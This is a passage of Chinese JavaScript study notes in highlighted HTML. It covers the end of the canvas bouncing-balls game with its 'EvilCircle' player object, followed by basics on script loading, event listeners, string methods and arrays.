class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>velY<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">-</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>velY <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>velY<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">+=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>velX<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">+=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>velY<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 定义碰撞检测函数</span><span class="token class-name">Ball</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">collisionDetect</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> balls<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">!==</span> balls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> dx <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">-</span> balls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span>      <span class="token keyword">const</span> dy <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">-</span> balls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>      <span class="token keyword">const</span> distance <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span>dx <span class="token operator">*</span> dx <span class="token operator">+</span> dy <span class="token operator">*</span> dy<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>distance <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size <span class="token operator">+</span> balls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">&amp;&amp;</span> balls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>exists<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        balls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token function">randomColor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 定义 EvilCircle 构造器, 继承自 Shape</span><span class="token keyword">function</span> <span class="token function">EvilCircle</span><span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> exists</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">Shape</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> exists<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token string">'white'</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">EvilCircle</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">Shape</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">EvilCircle</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> EvilCircle<span class="token punctuation">;</span><span class="token comment">// 定义 EvilCircle 绘制方法</span><span class="token class-name">EvilCircle</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">draw</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ctx<span class="token punctuation">.</span>strokeStyle <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>color<span class="token punctuation">;</span>  ctx<span class="token punctuation">.</span>lineWidth <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>x<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> Math<span class="token punctuation">.</span><span class="token constant">PI</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ctx<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 定义 EvilCircle 的边缘检测（checkBounds）方法</span><span class="token class-name">EvilCircle</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">checkBounds</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> width<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">-=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">-</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">+=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> height<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">-=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">-</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">+=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 定义 EvilCircle 控制设置（setControls）方法</span><span class="token class-name">EvilCircle</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">setControls</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  window<span class="token punctuation">.</span><span class="token function-variable function">onkeydown</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">case</span> <span class="token string">'a'</span><span class="token operator">:</span>      <span class="token keyword">case</span> <span class="token string">'A'</span><span class="token operator">:</span>      <span class="token keyword">case</span> <span class="token string">'ArrowLeft'</span><span class="token operator">:</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">-=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>velX<span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token string">'d'</span><span class="token operator">:</span>      <span class="token keyword">case</span> <span class="token string">'D'</span><span class="token operator">:</span>      <span class="token keyword">case</span> <span class="token string">'ArrowRight'</span><span class="token operator">:</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">+=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>velX<span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token string">'w'</span><span class="token operator">:</span>      <span class="token keyword">case</span> <span class="token string">'W'</span><span class="token operator">:</span>      <span class="token keyword">case</span> <span class="token string">'ArrowUp'</span><span class="token operator">:</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">-=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>velY<span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token operator">:</span>      <span class="token keyword">case</span> <span class="token string">'S'</span><span class="token operator">:</span>      <span class="token keyword">case</span> <span class="token string">'ArrowDown'</span><span class="token operator">:</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">+=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>velY<span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 定义 EvilCircle 冲突检测函数</span><span class="token class-name">EvilCircle</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">collisionDetect</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> balls<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> balls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>exists <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> dx <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">-</span> balls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span>      <span class="token keyword">const</span> dy <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">-</span> balls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>      <span class="token keyword">const</span> distance <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span>dx <span class="token operator">*</span> dx <span class="token operator">+</span> dy <span class="token operator">*</span> dy<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>distance <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size <span class="token operator">+</span> balls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        balls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>exists <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        count<span class="token operator">--</span><span class="token punctuation">;</span>        para<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">'剩余彩球数：'</span> <span class="token operator">+</span> count<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 定义一个数组，生成并保存所有的球，</span><span class="token keyword">const</span> balls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>balls<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> size <span class="token operator">=</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> ball <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ball</span><span class="token punctuation">(</span>    <span class="token comment">// 为避免绘制错误，球至少离画布边缘球本身一倍宽度的距离</span>    <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">+</span> size<span class="token punctuation">,</span> width <span class="token operator">-</span> size<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">+</span> size<span class="token punctuation">,</span> height <span class="token operator">-</span> size<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">random</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">random</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token function">randomColor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    size  <span class="token punctuation">)</span><span class="token punctuation">;</span>  balls<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>ball<span class="token punctuation">)</span><span class="token punctuation">;</span>  count<span class="token operator">++</span><span class="token punctuation">;</span>  para<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">'剩余彩球数：'</span> <span class="token operator">+</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义一个循环来不停地播放</span><span class="token keyword">let</span> evil <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EvilCircle</span><span class="token punctuation">(</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> width<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>evil<span class="token punctuation">.</span><span class="token function">setControls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  ctx<span class="token punctuation">.</span>fillStyle <span class="token operator">=</span> <span class="token string">'rgba(0,0,0,0.25)'</span><span class="token punctuation">;</span>  ctx<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> balls<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>balls<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>exists<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      balls<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      balls<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      balls<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">collisionDetect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  evil<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  evil<span class="token punctuation">.</span><span class="token function">checkBounds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  evil<span class="token punctuation">.</span><span class="token function">collisionDetect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>loop<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p><code>style.css</code></p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">html, body</span> <span class="token punctuation">&#123;</span>  <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">html</span> <span class="token punctuation">&#123;</span>  <span class="token property">font-family</span><span class="token punctuation">:</span> sans-serif<span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">body</span> <span class="token punctuation">&#123;</span>  <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span> inherit<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">h1</span> <span class="token punctuation">&#123;</span>  <span class="token property">font-size</span><span class="token punctuation">:</span> 2rem<span class="token punctuation">;</span>  <span class="token property">letter-spacing</span><span class="token punctuation">:</span> -1px<span class="token punctuation">;</span>  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>  <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>  <span class="token property">top</span><span class="token punctuation">:</span> -4px<span class="token punctuation">;</span>  <span class="token property">right</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>  <span class="token property">color</span><span class="token punctuation">:</span> transparent<span class="token punctuation">;</span>  <span class="token property">text-shadow</span><span class="token punctuation">:</span> 0 0 4px white<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">p</span> <span class="token punctuation">&#123;</span>  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>  <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>  <span class="token property">top</span><span class="token punctuation">:</span> 35px<span class="token punctuation">;</span>  <span class="token property">right</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>  <span class="token property">color</span><span class="token punctuation">:</span> #aaa<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="javascript">JavaScript</h3><h4 id="什么是js">什么是Js</h4><ul><li><p>Web 技术蛋糕三层</p></li><li><p>Html</p></li><li><p>Css</p></li><li><p>Js</p></li><li><p>JavaScript 是轻量级解释型语言。浏览器接受到 JavaScript代码，并以代码自身的文本格式运行它。技术上，几乎所有 JavaScript转换器都运用了一种叫做即时编译（<code>just-in-time compiling</code>）的技术；当JavaScript源代码被执行时，它会被编译成<code>二进制</code>的格式，使代码运行速度更快。尽管如此，JavaScript仍然是一门解释型语言，因为编译过程发生在代码运行中，而非之前。</p></li><li><p>流行的服务器端 web语言包括：<code>PHP、Python、Ruby、ASP.NET 以及...... JavaScript</code></p></li><li><p>内部Js和外部Js</p></li><li><p>若 JavaScript 加载于欲操作的 HTML 元素之前，则代码将出错</p></li><li><p><strong>内部</strong>示例</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"DOMContentLoaded"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这是一个事件监听器，它监听浏览器的 "<code>DOMContentLoaded</code>"事件，即 HTML 文档体加载、解释完毕事件。事件触发时将调用 "<code>. . .</code>"处的代码，从而避免了错误发生（事件的概念稍后学习）。</p><p>“<strong>外部</strong>”示例中使用了 JavaScript的一项现代技术（<code>async</code>“异步”属性）来解决这一问题，它告知浏览器在遇到<code>&lt;script&gt;</code> 元素时不要中断后续 HTML 内容的加载。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"script.js"</span> async<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><ul><li>如果脚本无需等待页面解析，且无依赖独立运行，那么应使用<code>async</code>。</li><li>如果脚本需要等待页面解析，且依赖于其他脚本，调用这些脚本时应使用<code>defer</code>，将关联的脚本按所需顺序置于 HTML 中。</li></ul></li></ul><h4 id="js初体验">Js初体验</h4><ul><li><p>事件监听器、事件处理器</p></li><li><p>Code</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">guessSubmit<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> checkGuess<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这里为 <code>guessSubmit</code>按钮添加了一个事件监听器。<code>addEventListener()</code>方法包含两个可输入值（称为“<em>参数</em>”（argument）），监听事件的类型（本例中为<code>click</code>），和当事件发生时我们想要执行的代码（本例中为<code>checkGuess()</code> 函数）。注意，<code>addEventListener()</code>中作为参数的函数名不加括号。</p></li><li><p>即使 <code>resetParas</code>是一个常量，我们也可以更改其内部属性，例如<code>textContent</code></p></li><li><p>JavaScript中一切都是<strong>对象</strong>。对象是存储在单个分组中的相关功能的集合。</p></li><li><p><code>guessField.focus()</code>是一行代码，用于将焦点设置到<code>guessField</code>输入字段上。</p><p>当调用<code>guessField.focus()</code>时，浏览器会将焦点移动到<code>guessField</code>输入字段，使用户可以立即在该字段上进行输入，而无需手动单击输入字段。这对于提升用户体验和方便用户进行连续的输入操作非常有用。</p><p>通过将焦点设置到输入字段上，用户可以直接开始键入新的猜测值，而无需手动选择输入字段。这在游戏中的重置操作中特别有用，以便用户可以立即开始新的猜测。</p></li><li><p>不包含对表单元素引用的变量不提供 focus() 方法。例如，引用<code>&lt;p&gt;</code> 元素的 <code>guesses</code> 常量，包含一个数字的<code>guessCount</code> 变量。</p></li></ul><h4 id="有用的字符串方法">有用的字符串方法</h4><ul><li><p>Code</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 1. </span>browserType<span class="token punctuation">[</span>browserType<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 2. </span>browserType<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'zilla'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 3. </span><span class="token keyword">if</span><span class="token punctuation">(</span>browserType<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'mozilla'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// do stuff with the string</span><span class="token punctuation">&#125;</span><span class="token comment">// 4. 当你知道字符串中的子字符串开始的位置，以及想要结束的字符时</span>browserType<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 5. 在某个字符之后提取字符串中的所有剩余字符，则不必包含第二个参数</span>browserType<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 6.  统一大小写</span><span class="token keyword">let</span> radData <span class="token operator">=</span> <span class="token string">'My NaMe Is MuD'</span><span class="token punctuation">;</span>radData<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>radData<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 7. 要被替换下的字符串和要被替换上的字符串</span>browserType<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'moz'</span><span class="token punctuation">,</span><span class="token string">'van'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h4 id="数组">数组</h4><ul><li><p>Code</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F; 1. 混合和匹配项目类型 - 它们并不都是数字，字符串等let random &#x3D; [&#39;tree&#39;, 795, [0, 1, 2]];</code></pre></li><li><p>字符串和数组之间的转换</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> myData <span class="token operator">=</span> <span class="token string">'Manchester,London,Liverpool,Birmingham,Leeds,Carlisle'</span><span class="token punctuation">;</span><span class="token keyword">let</span> myArray <span class="token operator">=</span> myData<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span>myArray<span class="token punctuation">;</span>myArray<span class="token punctuation">.</span>length<span class="token punctuation">;</span>myArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// the first item in the array</span>myArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// the second item in the array</span>myArray<span class="token punctuation">[</span>myArray<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// the last item in the array</span><span class="token comment">// 相反的操作-1</span><span class="token keyword">let</span> myNewString <span class="token operator">=</span> myArray<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span>myNewString<span class="token punctuation">;</span><span class="token comment">// 2</span><span class="token keyword">let</span> dogNames <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Rocket"</span><span class="token punctuation">,</span><span class="token string">"Flash"</span><span class="token punctuation">,</span><span class="token string">"Bella"</span><span class="token punctuation">,</span><span class="token string">"Slugger"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>dogNames<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token 